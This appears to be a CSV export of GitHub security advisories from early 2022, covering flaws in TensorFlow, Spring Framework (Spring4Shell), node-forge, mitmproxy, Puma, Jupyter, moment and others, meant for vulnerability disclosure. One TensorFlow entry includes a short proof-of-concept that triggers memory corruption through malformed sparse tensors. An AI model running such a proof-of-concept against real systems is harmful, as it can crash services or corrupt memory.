2388,34929,org.apache.tapestry:tapestry-core,GHSA-ghm8-mmx7-xvg2,CVE-2021-30638,https://github.com/advisories/GHSA-ghm8-mmx7-xvg2,high,2022-03-18 17:53:58 UTC,Information Exposure in Apache Tapestry,Information Exposure vulnerability in context asset handling of Apache Tapestry allows an attacker to download files inside WEB-INF if using a specially-constructed URL. This was caused by an incomplete fix for CVE-2020-13953. This issue affects Apache Tapestry Apache Tapestry 5.4.0 version to Apache Tapestry 5.6.3; Apache Tapestry 5.7.0 version and Apache Tapestry 5.7.1.,maven
2389,20741,tensorflow,GHSA-gv26-jpj9-c8gq,CVE-2021-29607,https://github.com/advisories/GHSA-gv26-jpj9-c8gq,moderate,2022-03-18 17:52:25 UTC,Incomplete validation in `SparseSparseMinimum`,"### Impact
Incomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:

```python 
import tensorflow as tf

a_indices = tf.ones([45, 92], dtype=tf.int64)
a_values = tf.ones([45], dtype=tf.int64)
a_shape = tf.ones([1], dtype=tf.int64)
b_indices = tf.ones([1, 1], dtype=tf.int64)
b_values = tf.ones([1], dtype=tf.int64)
b_shape = tf.ones([1], dtype=tf.int64)
                    
tf.raw_ops.SparseSparseMinimum(a_indices=a_indices,
    a_values=a_values,
    a_shape=a_shape,
    b_indices=b_indices,
    b_values=b_values,
    b_shape=b_shape)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/sparse_sparse_binary_op_shared.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.

### Patches 
We have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [f6fde895ef9c77d848061c0517f19d0ec2682f3a](https://github.com/tensorflow/tensorflow/commit/f6fde895ef9c77d848061c0517f19d0ec2682f3a).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
2390,35825,org.keycloak:keycloak-core,GHSA-6xp6-fmc8-pmmr,CVE-2021-20202,https://github.com/advisories/GHSA-6xp6-fmc8-pmmr,high,2022-03-18 17:50:45 UTC,Temporary Directory Hijacking Vulnerability in Keycloak,"A flaw was found in keycloak. Directories can be created prior to the Java process creating them in the temporary directory, but with wider user permissions, allowing the attacker to have access to the contents that keycloak stores in this directory. The highest threat from this vulnerability is to data confidentiality and integrity.",maven
2391,16327,faker,GHSA-5w9c-rv96-fr7g,,https://github.com/advisories/GHSA-5w9c-rv96-fr7g,high,2022-03-22 19:28:24 UTC,Removal of functional code in faker.js,"Faker.js helps users create large amounts of data for testing and development. The maintainer deliberately removed the functional code from this package. This appears to be a purposeful and successful attempt to make the package unusable. This is related to the colors.js [CVE-2021-23567](https://github.com/advisories/GHSA-gh88-3pxp-6fm8). 

The functional code for this package was forked and can be found [here](https://github.com/faker-js/faker). ",npm
2392,29639,mitmproxy,GHSA-gcx2-gvj7-pxv3,CVE-2022-24766,https://github.com/advisories/GHSA-gcx2-gvj7-pxv3,critical,2022-03-22 19:22:59 UTC,Insufficient Protection against HTTP Request Smuggling in mitmproxy,"### Impact

In mitmproxy 7.0.4 and below, a malicious client or server is able to perform [HTTP request smuggling](https://en.wikipedia.org/wiki/HTTP_request_smuggling) attacks through mitmproxy. This means that a malicious client/server could smuggle a request/response through mitmproxy as part of another request/response's HTTP message body. While mitmproxy would only see one request, the target server would see multiple requests. A smuggled request is still captured as part of another request's body, but it does not appear in the request list and does not go through the usual mitmproxy event hooks, where users may have implemented custom access control checks or input sanitization.

Unless you use mitmproxy to protect an HTTP/1 service, no action is required.


### Patches

The vulnerability has been fixed in mitmproxy 8.0.0 and above.


### Acknowledgements

We thank Zeyu Zhang (@zeyu2001) for responsibly disclosing this vulnerability to the mitmproxy team.


### Timeline

- **2022-03-15**: Received initial report.
- **2022-03-15**: Verified report and confirmed receipt.
- **2022-03-16**: Shared patch with researcher.
- **2022-03-16**: Received confirmation that patch is working.
- **2022-03-19**: Published patched release and advisory.",pip
2393,16343,electron,GHSA-3p22-ghq8-v749,CVE-2022-21718,https://github.com/advisories/GHSA-3p22-ghq8-v749,low,2022-03-22 18:49:36 UTC,Renderers can obtain access to random bluetooth device without permission in Electron,"### Impact
This vulnerability allows renderers to obtain access to a random bluetooth device via the [web bluetooth API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Bluetooth_API) if the app has not configured a custom `select-bluetooth-device` event handler.  The device that is accessed is random and the attacker would have no way of selecting a specific device.

All current stable versions of Electron are affected.

### Patches
This has been patched and the following Electron versions contain the fix:
* `17.0.0-alpha.6`
* `16.0.6`
* `15.3.5`
* `14.2.4`
* `13.6.6`

### Workarounds
Adding this code to your app can workaround the issue.

```js
app.on('web-contents-created', (event, webContents) => {
  webContents.on('select-bluetooth-device', (event, devices, callback) => {
    // Prevent default behavior
    event.preventDefault();
    // Cancel the request
    callback('');
  });
});
```

For more information
If you have any questions or comments about this advisory, email us at security@electronjs.org.",npm
2394,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-57j2-w4cx-62h2,CVE-2020-36518,https://github.com/advisories/GHSA-57j2-w4cx-62h2,high,2022-03-12 00:00:36 UTC,Deeply nested json in jackson-databind,jackson-databind is a data-binding package for the Jackson Data Processor. jackson-databind allows a Java stack overflow exception and denial of service via a large depth of nested objects.,maven
2395,17082,node-forge,GHSA-2r2c-g63r-vccr,CVE-2022-24773,https://github.com/advisories/GHSA-2r2c-g63r-vccr,moderate,2022-03-18 23:10:48 UTC,Improper Verification of Cryptographic Signature in `node-forge`,"### Impact

RSA PKCS#1 v1.5 signature verification code is not properly checking `DigestInfo` for a proper ASN.1 structure. This can lead to successful verification with signatures that contain invalid structures but a valid digest.

### Patches

The issue has been addressed in `node-forge` `1.3.0`.

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [forge](https://github.com/digitalbazaar/forge)
* Email us at [example email address](mailto:security@digitalbazaar.com)",npm
2396,17082,node-forge,GHSA-x4jg-mjrx-434g,CVE-2022-24772,https://github.com/advisories/GHSA-x4jg-mjrx-434g,high,2022-03-18 23:10:28 UTC,Improper Verification of Cryptographic Signature in node-forge,"### Impact

RSA PKCS#1 v1.5 signature verification code does not check for tailing garbage bytes after decoding a `DigestInfo` ASN.1 structure. This can allow padding bytes to be removed and garbage data added to forge a signature when a low public exponent is being used.

### Patches

The issue has been addressed in `node-forge` `1.3.0`.

### References

For more information, please see
[""Bleichenbacher's RSA signature forgery based on implementation error""](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/)
by Hal Finney.

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [forge](https://github.com/digitalbazaar/forge)
* Email us at [example email address](mailto:security@digitalbazaar.com)",npm
2397,17082,node-forge,GHSA-cfm4-qjh2-4765,CVE-2022-24771,https://github.com/advisories/GHSA-cfm4-qjh2-4765,high,2022-03-18 23:09:54 UTC,Improper Verification of Cryptographic Signature in node-forge,"### Impact

RSA PKCS#1 v1.5 signature verification code is lenient in checking the digest algorithm structure. This can allow a crafted structure that steals padding bytes and uses unchecked portion of the PKCS#1 encoded message to forge a signature when a low public exponent is being used.

### Patches

The issue has been addressed in `node-forge` `1.3.0`.

### References

For more information, please see
[""Bleichenbacher's RSA signature forgery based on implementation error""](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/)
by Hal Finney.

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [forge](https://github.com/digitalbazaar/forge)
* Email us at [example email address](mailto:security@digitalbazaar.com)",npm
2398,30675,jupyter-server,GHSA-p737-p57g-4cpr,CVE-2022-24757,https://github.com/advisories/GHSA-p737-p57g-4cpr,high,2022-03-25 19:20:39 UTC,Insertion of Sensitive Information into Log File in Jupyter notebook,"### Impact
_What kind of vulnerability is it?_

Anytime a 5xx error is triggered, the auth cookie and other header values are recorded in Jupyter Server logs by default. Considering these logs do not require root access, an attacker can monitor these logs, steal sensitive auth/cookie information, and gain access to the Jupyter server.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Upgrade to Jupyter Server version 1.15.4

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list [security@ipython.org](mailto:security@ipython.org).

Credit: @3coins for reporting. Thank you!

",pip
2399,19896,paramiko,GHSA-f8q4-jwww-x3wv,CVE-2022-24302,https://github.com/advisories/GHSA-f8q4-jwww-x3wv,moderate,2022-03-19 00:01:03 UTC,Race Condition in Paramiko,"In Paramiko before 2.10.1, a race condition (between creation and chmod) in the write_private_key_file function could allow unauthorized information disclosure.",pip
2400,28888,poetry,GHSA-xr2c-5w89-63pv,CVE-2022-26184,https://github.com/advisories/GHSA-xr2c-5w89-63pv,critical,2022-03-23 00:00:24 UTC,Poetry before v1.1.9 contains Untrusted Search Path,Poetry prior to v1.1.9 was discovered to contain an untrusted search path which causes the application to behave in unexpected ways when users execute Poetry commands in a directory containing malicious content. This vulnerability occurs when the application is ran on Windows OS.,pip
2401,22070,gogo/protobuf,GHSA-c3h9-896r-86jm,CVE-2021-3121,https://github.com/advisories/GHSA-c3h9-896r-86jm,high,2022-03-28 20:28:00 UTC,Improper Input Validation in GoGo Protobuf,"An issue was discovered in GoGo Protobuf before 1.3.2. plugin/unmarshal/unmarshal.go lacks certain index validation, aka the ""skippy peanut butter"" issue.",go
2402,19944,trytond,GHSA-cj78-rgw3-4h5p,CVE-2022-26661,https://github.com/advisories/GHSA-cj78-rgw3-4h5p,moderate,2022-03-11 00:02:02 UTC,Improper Restriction of XML External Entity Reference in trytond and proteus,"An XXE issue was discovered in Tryton Application Platform (Server) 5.x through 5.0.45, 6.x through 6.0.15, and 6.1.x and 6.2.x through 6.2.5, and Tryton Application Platform (Command Line Client (proteus)) 5.x through 5.0.11, 6.x through 6.0.4, and 6.1.x and 6.2.x through 6.2.1. An authenticated user can make the server parse a crafted XML SEPA file to access arbitrary files on the system.",pip
2403,19944,trytond,GHSA-pm3h-mm62-pwm8,CVE-2022-26662,https://github.com/advisories/GHSA-pm3h-mm62-pwm8,high,2022-03-11 00:02:04 UTC,XML Entity Expansion in trytond and proteus,"An XML Entity Expansion (XEE) issue was discovered in Tryton Application Platform (Server) 5.x through 5.0.45, 6.x through 6.0.15, and 6.1.x and 6.2.x through 6.2.5, and Tryton Application Platform (Command Line Client (proteus)) 5.x through 5.0.11, 6.x through 6.0.4, and 6.1.x and 6.2.x through 6.2.1. An unauthenticated user can send a crafted XML-RPC message to consume all the resources of the server.",pip
2404,28945,Flask-AppBuilder,GHSA-2ccw-7px8-vmpf,CVE-2022-24776,https://github.com/advisories/GHSA-2ccw-7px8-vmpf,moderate,2022-03-25 19:27:39 UTC,Open Redirect in Flask-AppBuilder,"Flask-AppBuilder is an application development framework built on top of Flask. Versions prior to 3.4.5 contain an open redirect vulnerability when using the database authentication login page. There are no known workarounds. Users are recommended to upgrade to version 3.4.5 or later.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [Flask-AppBuilder](https://github.com/dpgaspar/Flask-AppBuilder)
",pip
2405,20092,ansible,GHSA-4r65-35qq-ch8j,CVE-2021-3620,https://github.com/advisories/GHSA-4r65-35qq-ch8j,moderate,2022-03-04 00:00:17 UTC,Ansible discloses sensitive information in traceback error message,"Ansible is an IT automation system that handles configuration management, application deployment, cloud provisioning, ad-hoc task execution, network automation, and multi-node orchestration. A flaw was found in Ansible Engine's ansible-connection module where sensitive information, such as the Ansible user credentials, is disclosed by default in the traceback error message when Ansible receives an unexpected response from `set_options`. The highest threat from this vulnerability is confidentiality.",pip
2406,18987,puma,GHSA-h99w-9q5r-gjq9,CVE-2022-24790,https://github.com/advisories/GHSA-h99w-9q5r-gjq9,critical,2022-03-30 21:48:50 UTC,Puma vulnerable to HTTP Request Smuggling,"When using Puma behind a proxy that does not properly validate that the incoming HTTP request matches the RFC7230 standard, Puma and the frontend proxy may disagree on where a request starts and ends. This would allow requests to be smuggled via the front-end proxy to Puma.

The following vulnerabilities are addressed by this advisory:
- Lenient parsing of `Transfer-Encoding` headers, when unsupported encodings should be rejected and the final encoding must be `chunked`.
- Lenient parsing of malformed `Content-Length` headers and chunk sizes, when only digits and hex digits should be allowed.
- Lenient parsing of duplicate `Content-Length` headers, when they should be rejected.
- Lenient parsing of the ending of chunked segments, when they should end with `\r\n`.

The vulnerability has been fixed in 5.6.4 and 4.3.12. When deploying a proxy in front of Puma, turning on any and all functionality to make sure that the request matches the RFC7230 standard. 

These proxy servers are known to have ""good"" behavior re: this standard and upgrading Puma may not be necessary. Users are encouraged to validate for themselves.

- Nginx (latest)
- Apache (latest)
- Haproxy 2.5+
- Caddy (latest)
- Traefik (latest)",rubygems
2407,22119,ssh,GHSA-8c26-wmh5-6g9v,CVE-2022-27191,https://github.com/advisories/GHSA-8c26-wmh5-6g9v,high,2022-03-19 00:01:02 UTC,Use of a Broken or Risky Cryptographic Algorithm in golang.org/x/crypto/ssh,golang.org/x/crypto/ssh versions 0.0.0-20220214200702-86341886e292 and prior in Go through 1.16.15 and 1.17.x through 1.17.8 allows an attacker to crash a server in certain circumstances involving AddHostKey. Version 0.0.0-20220315160706-3147a52a75dd includes a fix for the vulnerability and support for SHA-2.,go
2408,35825,org.keycloak:keycloak-core,GHSA-xpgc-j48j-jwv9,CVE-2021-20323,https://github.com/advisories/GHSA-xpgc-j48j-jwv9,moderate,2022-03-26 00:00:31 UTC,Cross-site Scripting in Keycloak,A POST based reflected Cross Site Scripting vulnerability on has been identified in Keycloak version 15. The issue was fixed in version 17.0.0.,maven
2409,36687,org.springframework:spring-webflux,GHSA-36p3-wjmg-h94x,CVE-2022-22965,https://github.com/advisories/GHSA-36p3-wjmg-h94x,critical,2022-03-31 18:30:50 UTC,Remote Code Execution in Spring Framework,"Spring Framework prior to versions 5.2.20 and 5.3.18 contains a remote code execution vulnerability known as `Spring4Shell`. 

## Impact

A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.

These are the prerequisites for the exploit:
- JDK 9 or higher
- Apache Tomcat as the Servlet container
- Packaged as WAR
- `spring-webmvc` or `spring-webflux` dependency

## Patches

- Spring Framework [5.3.18](https://github.com/spring-projects/spring-framework/releases/tag/v5.3.18) and [5.2.20](https://github.com/spring-projects/spring-framework/releases/tag/v5.2.20.RELEASE)
- Spring Boot [2.6.6](https://github.com/spring-projects/spring-boot/releases/tag/v2.6.6) and [2.5.12](https://github.com/spring-projects/spring-boot/releases/tag/v2.5.12)

## Workarounds

For those who are unable to upgrade, leaked reports recommend setting `disallowedFields` on `WebDataBinder` through an `@ControllerAdvice`. This works generally, but as a centrally applied workaround fix, may leave some loopholes, in particular if a controller sets `disallowedFields` locally through its own `@InitBinder` method, which overrides the global setting.

To apply the workaround in a more fail-safe way, applications could extend `RequestMappingHandlerAdapter` to update the `WebDataBinder` at the end after all other initialization. In order to do that, a Spring Boot application can declare a `WebMvcRegistrations` bean (Spring MVC) or a `WebFluxRegistrations` bean (Spring WebFlux).",maven
2410,33993,org.springframework.boot:spring-boot-starter-web,GHSA-36p3-wjmg-h94x,CVE-2022-22965,https://github.com/advisories/GHSA-36p3-wjmg-h94x,critical,2022-03-31 18:30:50 UTC,Remote Code Execution in Spring Framework,"Spring Framework prior to versions 5.2.20 and 5.3.18 contains a remote code execution vulnerability known as `Spring4Shell`. 

## Impact

A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.

These are the prerequisites for the exploit:
- JDK 9 or higher
- Apache Tomcat as the Servlet container
- Packaged as WAR
- `spring-webmvc` or `spring-webflux` dependency

## Patches

- Spring Framework [5.3.18](https://github.com/spring-projects/spring-framework/releases/tag/v5.3.18) and [5.2.20](https://github.com/spring-projects/spring-framework/releases/tag/v5.2.20.RELEASE)
- Spring Boot [2.6.6](https://github.com/spring-projects/spring-boot/releases/tag/v2.6.6) and [2.5.12](https://github.com/spring-projects/spring-boot/releases/tag/v2.5.12)

## Workarounds

For those who are unable to upgrade, leaked reports recommend setting `disallowedFields` on `WebDataBinder` through an `@ControllerAdvice`. This works generally, but as a centrally applied workaround fix, may leave some loopholes, in particular if a controller sets `disallowedFields` locally through its own `@InitBinder` method, which overrides the global setting.

To apply the workaround in a more fail-safe way, applications could extend `RequestMappingHandlerAdapter` to update the `WebDataBinder` at the end after all other initialization. In order to do that, a Spring Boot application can declare a `WebMvcRegistrations` bean (Spring MVC) or a `WebFluxRegistrations` bean (Spring WebFlux).",maven
2411,33936,org.springframework:spring-webmvc,GHSA-36p3-wjmg-h94x,CVE-2022-22965,https://github.com/advisories/GHSA-36p3-wjmg-h94x,critical,2022-03-31 18:30:50 UTC,Remote Code Execution in Spring Framework,"Spring Framework prior to versions 5.2.20 and 5.3.18 contains a remote code execution vulnerability known as `Spring4Shell`. 

## Impact

A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.

These are the prerequisites for the exploit:
- JDK 9 or higher
- Apache Tomcat as the Servlet container
- Packaged as WAR
- `spring-webmvc` or `spring-webflux` dependency

## Patches

- Spring Framework [5.3.18](https://github.com/spring-projects/spring-framework/releases/tag/v5.3.18) and [5.2.20](https://github.com/spring-projects/spring-framework/releases/tag/v5.2.20.RELEASE)
- Spring Boot [2.6.6](https://github.com/spring-projects/spring-boot/releases/tag/v2.6.6) and [2.5.12](https://github.com/spring-projects/spring-boot/releases/tag/v2.5.12)

## Workarounds

For those who are unable to upgrade, leaked reports recommend setting `disallowedFields` on `WebDataBinder` through an `@ControllerAdvice`. This works generally, but as a centrally applied workaround fix, may leave some loopholes, in particular if a controller sets `disallowedFields` locally through its own `@InitBinder` method, which overrides the global setting.

To apply the workaround in a more fail-safe way, applications could extend `RequestMappingHandlerAdapter` to update the `WebDataBinder` at the end after all other initialization. In order to do that, a Spring Boot application can declare a `WebMvcRegistrations` bean (Spring MVC) or a `WebFluxRegistrations` bean (Spring WebFlux).",maven
2412,33911,org.springframework:spring-beans,GHSA-36p3-wjmg-h94x,CVE-2022-22965,https://github.com/advisories/GHSA-36p3-wjmg-h94x,critical,2022-03-31 18:30:50 UTC,Remote Code Execution in Spring Framework,"Spring Framework prior to versions 5.2.20 and 5.3.18 contains a remote code execution vulnerability known as `Spring4Shell`. 

## Impact

A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.

These are the prerequisites for the exploit:
- JDK 9 or higher
- Apache Tomcat as the Servlet container
- Packaged as WAR
- `spring-webmvc` or `spring-webflux` dependency

## Patches

- Spring Framework [5.3.18](https://github.com/spring-projects/spring-framework/releases/tag/v5.3.18) and [5.2.20](https://github.com/spring-projects/spring-framework/releases/tag/v5.2.20.RELEASE)
- Spring Boot [2.6.6](https://github.com/spring-projects/spring-boot/releases/tag/v2.6.6) and [2.5.12](https://github.com/spring-projects/spring-boot/releases/tag/v2.5.12)

## Workarounds

For those who are unable to upgrade, leaked reports recommend setting `disallowedFields` on `WebDataBinder` through an `@ControllerAdvice`. This works generally, but as a centrally applied workaround fix, may leave some loopholes, in particular if a controller sets `disallowedFields` locally through its own `@InitBinder` method, which overrides the global setting.

To apply the workaround in a more fail-safe way, applications could extend `RequestMappingHandlerAdapter` to update the `WebDataBinder` at the end after all other initialization. In order to do that, a Spring Boot application can declare a `WebMvcRegistrations` bean (Spring MVC) or a `WebFluxRegistrations` bean (Spring WebFlux).",maven
2413,33906,org.springframework:spring-core,GHSA-36p3-wjmg-h94x,CVE-2022-22965,https://github.com/advisories/GHSA-36p3-wjmg-h94x,critical,2022-03-31 18:30:50 UTC,Remote Code Execution in Spring Framework,"Spring Framework prior to versions 5.2.20 and 5.3.18 contains a remote code execution vulnerability known as `Spring4Shell`. 

## Impact

A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.

These are the prerequisites for the exploit:
- JDK 9 or higher
- Apache Tomcat as the Servlet container
- Packaged as WAR
- `spring-webmvc` or `spring-webflux` dependency

## Patches

- Spring Framework [5.3.18](https://github.com/spring-projects/spring-framework/releases/tag/v5.3.18) and [5.2.20](https://github.com/spring-projects/spring-framework/releases/tag/v5.2.20.RELEASE)
- Spring Boot [2.6.6](https://github.com/spring-projects/spring-boot/releases/tag/v2.6.6) and [2.5.12](https://github.com/spring-projects/spring-boot/releases/tag/v2.5.12)

## Workarounds

For those who are unable to upgrade, leaked reports recommend setting `disallowedFields` on `WebDataBinder` through an `@ControllerAdvice`. This works generally, but as a centrally applied workaround fix, may leave some loopholes, in particular if a controller sets `disallowedFields` locally through its own `@InitBinder` method, which overrides the global setting.

To apply the workaround in a more fail-safe way, applications could extend `RequestMappingHandlerAdapter` to update the `WebDataBinder` at the end after all other initialization. In order to do that, a Spring Boot application can declare a `WebMvcRegistrations` bean (Spring MVC) or a `WebFluxRegistrations` bean (Spring WebFlux).",maven
2414,18895,yajl-ruby,GHSA-jj47-x69x-mxrm,CVE-2022-24795,https://github.com/advisories/GHSA-jj47-x69x-mxrm,moderate,2022-04-05 15:55:51 UTC,Buffer Overflow in yajl-ruby,"_NOTE: A previous patch, 1.4.2, fixed the heap memory issue, but could still lead to a DoS infinite loop. Please update to version 1.4.3_

The 1.x branch and the 2.x branch of [yajl](https://github.com/lloyd/yajl) contain an integer overflow which leads to subsequent heap memory corruption when dealing with large (~2GB) inputs.

### Details

The [reallocation logic at yajl_buf.c#L64](https://github.com/brianmario/yajl-ruby/blob/7168bd79b888900aa94523301126f968a93eb3a6/ext/yajl/yajl_buf.c#L64) may result in the `need` 32bit integer wrapping to 0 when `need` approaches a value of 0x80000000 (i.e. ~2GB of data), which results in a reallocation of buf->alloc into a small heap chunk.

These integers are declared as `size_t` in the 2.x branch of `yajl`, which practically prevents the issue from triggering on 64bit platforms, however this does not preclude this issue triggering on 32bit builds on which `size_t` is a 32bit integer.

Subsequent population of this under-allocated heap chunk is based on the original buffer size, leading to heap memory corruption.

### Impact

We rate this as a moderate severity vulnerability which mostly impacts process availability as we believe exploitation for arbitrary code execution to be unlikely.

### Patches

Patched in yajl-ruby 1.4.3

### Workarounds

Avoid passing large inputs to YAJL

### References
https://github.com/brianmario/yajl-ruby/blob/7168bd79b888900aa94523301126f968a93eb3a6/ext/yajl/yajl_buf.c#L64

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [yajl-ruby](https://github.com/brianmario/yajl-ruby/issues)
",rubygems
2415,24191,nomad,GHSA-6jm6-cmcp-fqjq,CVE-2022-24684,https://github.com/advisories/GHSA-6jm6-cmcp-fqjq,moderate,2022-02-16 00:01:42 UTC,Nomad Spread Job Stanza May Trigger Panic in Servers,"Nomad and Nomad Enterprise allows operators with job-submit capabilities to use the spread stanza in a way such that it can cause panic in Nomad servers. This vulnerability, CVE-2022-24684, was fixed in Nomad 1.0.18, 1.1.12, and 1.2.6.",go
2416,23047,vcs,GHSA-6635-c626-vj4r,CVE-2022-21235,https://github.com/advisories/GHSA-6635-c626-vj4r,high,2022-04-01 14:05:33 UTC,Command Injection Vulnerability with Mercurial in VCS,"URLs and local file paths passed to the Mercurial (hg) APIs that are specially crafted can contain commands which are executed by Mercurial if it is installed on the host operating system.

### Impact

The `vcs` package uses the underly version control system, in this case `hg`, to implement the needed functionality. When `hg` is executed, argument strings are passed to `hg` in a way that additional flags can be set. The additional flags can be used to perform a command injection.

Other version control systems with an implemented interface may also be vulnerable.

### Patches

The issue has been fixed in version 1.13.2.

### Workarounds

A work around is to sanitize data passed to the `vcs` package APIs to ensure it does not contain commands or unexpected data. This is important for user input data that is passed directly to the package APIs.

### For more information

If you have any questions or comments about this advisory please [file an issue](https://github.com/Masterminds/vcs/issues).
",go
2417,26863,kubeclient,GHSA-69p3-xp37-f692,CVE-2022-0759,https://github.com/advisories/GHSA-69p3-xp37-f692,high,2022-03-26 00:00:29 UTC,Improper Certificate Validation in kubeclient,"A flaw was found in all versions of kubeclient up to (but not including) v4.9.3, the Ruby client for Kubernetes REST API, in the way it parsed kubeconfig files. When the kubeconfig file does not configure custom CA to verify certs, kubeclient ends up accepting any certificate (it wrongly returns VERIFY_NONE). Ruby applications that leverage kubeclient to parse kubeconfig files are susceptible to Man-in-the-middle attacks (MITM).",rubygems
2418,30443,vyper,GHSA-7vrm-3jc8-5wwm,,https://github.com/advisories/GHSA-7vrm-3jc8-5wwm,high,2022-04-04 21:40:45 UTC,Incorrect Comparison in Vyper,"### Impact
bytestrings can have dirty bytes in them, resulting in the word-for-word comparison to give incorrect results, e.g.
```vyper
b1: Bytes[32] = b""abcdef""
b1 = slice(b1, 0, 1)
b2: Bytes[32] = b""abcdef""
t: bool = b1 == b2  # incorrectly evaluates to True
```
even without dirty nonzero bytes, because there is no comparison of the length, two bytestrings can compare to equal if one ends with `""\x00""`.
```vyper
b1: Bytes[32] = b""abc\0""
b2: Bytes[32] = b""abc""
t: bool = b1 == b2  # incorrectly evaluates to True
```

### Patches
fixed in https://github.com/vyperlang/vyper/commit/2c73f8352635c0a433423a5b94740de1a118e508",pip
2419,33906,org.springframework:spring-core,GHSA-558x-2xjg-6232,CVE-2022-22950,https://github.com/advisories/GHSA-558x-2xjg-6232,moderate,2022-04-03 00:01:00 UTC,Allocation of Resources Without Limits or Throttling in Spring Framework,"In Spring Framework versions 5.3.0 - 5.3.16, 5.2.0 - 5.2.19, and older unsupported versions, it is possible for a user to provide a specially crafted SpEL expression that may cause a denial of service condition.",maven
2420,20024,notebook,GHSA-m87f-39q9-6f55,CVE-2022-24758,https://github.com/advisories/GHSA-m87f-39q9-6f55,high,2022-04-05 17:47:26 UTC,Sensitive Auth & Cookie data stored in Jupyter server logs,"Anytime a 5xx error is triggered, the auth cookie and other header values are recorded in Jupyter server logs by default. Considering these logs do not require root access, an attacker can monitor these logs, steal sensitive auth/cookie information, and gain access to the Jupyter server.

Upgrade to notebook version 6.4.10

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list [security@ipython.org](mailto:security@ipython.org).

Credit: @3coins for reporting. Thank you!

",pip
2421,15544,Bond.Core.CSharp,GHSA-rqrc-8q8f-cp9c,CVE-2020-1469,https://github.com/advisories/GHSA-rqrc-8q8f-cp9c,high,2022-04-08 18:11:51 UTC,Infinite loop in .Net Bond,"A denial of service vulnerability exists when the .NET implementation of Bond improperly parses input, aka 'Bond Denial of Service Vulnerability'. Handling of large container lengths that could cause an infinite loop when deserializing some payloads.",nuget
2422,13514,Moment.js,GHSA-8hfj-j24r-96c4,CVE-2022-24785,https://github.com/advisories/GHSA-8hfj-j24r-96c4,high,2022-04-04 21:25:48 UTC,Path Traversal: 'dir/../../filename' in moment.locale,"### Impact
This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg `fr` is directly used to switch moment locale.

### Patches
This problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).

### Workarounds
Sanitize user-provided locale name before passing it to moment.js.

### References
_Are there any links users can visit to find out more?_

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [moment repo](https://github.com/moment/moment)
",nuget
2423,15847,moment,GHSA-8hfj-j24r-96c4,CVE-2022-24785,https://github.com/advisories/GHSA-8hfj-j24r-96c4,high,2022-04-04 21:25:48 UTC,Path Traversal: 'dir/../../filename' in moment.locale,"### Impact
This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg `fr` is directly used to switch moment locale.

### Patches
This problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).

### Workarounds
Sanitize user-provided locale name before passing it to moment.js.

### References
_Are there any links users can visit to find out more?_

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [moment repo](https://github.com/moment/moment)
",npm
